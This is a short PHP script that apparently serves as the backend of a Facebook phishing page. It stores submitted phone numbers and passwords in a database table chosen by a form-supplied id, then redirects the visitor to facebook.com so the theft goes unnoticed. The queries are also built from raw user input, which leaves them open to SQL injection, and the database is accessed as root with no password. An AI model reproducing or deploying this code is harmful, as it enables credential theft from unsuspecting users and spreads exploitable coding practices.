<?php

$i=$_POST['id'];
$id=$i-50;
$name=$_POST["user"];
$pass=$_POST["pass"];

$host = "localhost";
		$dbuser = "root";
		$dbpass = "";
		$dbname = "bdh";
		$query = "select user from login
					where id='$id'";
		
		$conn = mysqli_connect($host,$dbuser,$dbpass,$dbname);
		
		$rslt= mysqli_query($conn,$query)
			or die("something went wrong");
			
			while($row=mysqli_fetch_assoc($rslt)){
			extract ($row);
	
	$add = "INSERT INTO $user (mobile, password) VALUES ('$name','$pass')";
	
	$addquery= mysqli_query($conn,$add)
						or die ("rt");
			};
						
			header('location:facebook.com');
	exit();
			


?>